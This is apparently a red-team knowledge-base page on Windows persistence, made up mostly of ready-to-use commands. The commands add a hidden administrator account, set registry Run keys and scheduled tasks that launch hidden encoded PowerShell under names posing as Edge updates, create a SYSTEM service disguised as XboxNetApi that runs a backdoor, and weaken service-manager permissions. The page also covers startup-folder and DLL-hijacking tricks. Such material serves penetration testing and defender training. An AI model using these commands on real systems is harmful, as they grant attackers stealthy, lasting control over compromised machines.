---
title: Windows Persistence
---

[[notes/mitre-attack/persistence]] on [[notes/windows/index]].

References:

- [Persistence techniques detected by PersistenceSniper](https://github.com/last-byte/PersistenceSniper/wiki/3-%E2%80%90-Detections)
- [UWP / Packaged Desktop Application Startup Persistence](https://github.com/nasbench/Misc-Research/blob/main/Other/UWP-Applications-Persistence.md)

# Account Creation

~~~ bat
net.exe user hacker P@ssw0rd1234 /add
net.exe localgroup administrators hacker /add
~~~

Untested tools:

- [CreateHiddenAccount](https://github.com/wgpsec/createhiddenaccount)

# Startup Folder

As unprivileged user write an executable or LNK file into the autostart folder at `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` or as local admin at `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`.
It will be executed on logon in the users context.

`grpconv.exe` can be used to create files inside the autostart folder ([Source](https://mobile.twitter.com/cyb3rops/status/1526952076940652546)).

First write `%userprofile%\setup.ini`:

~~~
[progman.groups]
group001=Startup

[group001]
"FILENAME",PROGRAM,ICON,0,UNKNOWN,UNKNOWN,UNKNOWN
"Relative Calculator",calc.exe,calc.exe,0,,,
"Absolute Calculator",C:\Windows\System32\calc.exe,C:\Windows\System32\calc.exe,0,,,
"Calculator over CMD",cmd /c calc,calc.exe,0,,,
~~~

Then execute `grpconv.exe -o` to create the entry.

> **Note:**
> It is possible to use some environment variables in the *PROGRAM* field.
> For example `%comspec%` works, but `%userprofile%` doesn't, because `C:\` gets prepended somehow.

References:

- [persistence-info.github.io/data/startupfolder.html](https://persistence-info.github.io/Data/startupfolder.html)

# Registry Autorun Keys

As unprivileged user execute a command when the user logs in.

=== "builtin"
    ~~~ bat
    reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%"
    reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%"
    ~~~

As local admin execute a command when any user logs in (in the users context).

=== "builtin"
    ~~~ bat
    reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%"
    ~~~

References:

- [persistence-info.github.io/data/run.html](https://persistence-info.github.io/Data/run.html)

# Scheduled Task

As unprivileged user execute a command every hour.

=== "[[notes/tools/sharpersist]]"
    ~~~ bat
    .\SharPersist.exe -t schtask -n "MicrosoftEdgeUpdateTaskMachine" -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-w hidden -noni -nop -e %PAYLOAD%" -o daily -m add
    ~~~

=== "builtin"
    ~~~ bat
    schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%" /sc daily
    ~~~

As local admin execute a command on boot.

=== "bulitin"
    ~~~ bat
    schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%" /sc onstart /ru "NT Authority\SYSTEM" /rl highest
    ~~~

As local admin, execute a command when a member of a high value group logs in.

=== "builtin"
    ~~~ bat
    schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni -nop -ep bypass -e %PAYLOAD%" /sc onlogon /ru "corp.local\domain admins" /rl highest
    ~~~

Remove a scheduled task.

=== "builtin"
    ~~~ bat
    schtasks.exe /delete /tn "MicrosoftEdgeUpdateTaskMachine" /f
    ~~~

References:

- [persistence-info.github.io/data/taskscheduler.html](https://persistence-info.github.io/Data/taskscheduler.html)

# Service

Create a service as local admin.

=== "builtin"
    ~~~ bat
    sc.exe create XboxNetApi binPath= "C:\Program Files\Vendor\Backdoor.exe" start= auto
    sc.exe start XboxNetApi
    ~~~

As local admin allow everybody to create a service that runs as `system` ([source](https://twitter.com/0gtweet/status/1628720819537936386)).

=== "builtin"
    ~~~ bat
    sc.exe sdset scmanager D:(A;;KA;;;WD)
    ~~~

References:

- [persistence-info.github.io/data/services.html](https://persistence-info.github.io/Data/services.html)

# WMI Event Subscription

Under construction 🚧

# DLL Hijacking

Under construction 🚧

As local admin on a Windows Server write `wlanapi.dll` anywhere into the system `PATH`, then trigger NetMan from an interactive session trough COM ([source](http://web.archive.org/web/20230629210511/https://itm4n.github.io/windows-server-netman-dll-hijacking/)).

# COM Hijacking

Under construction 🚧
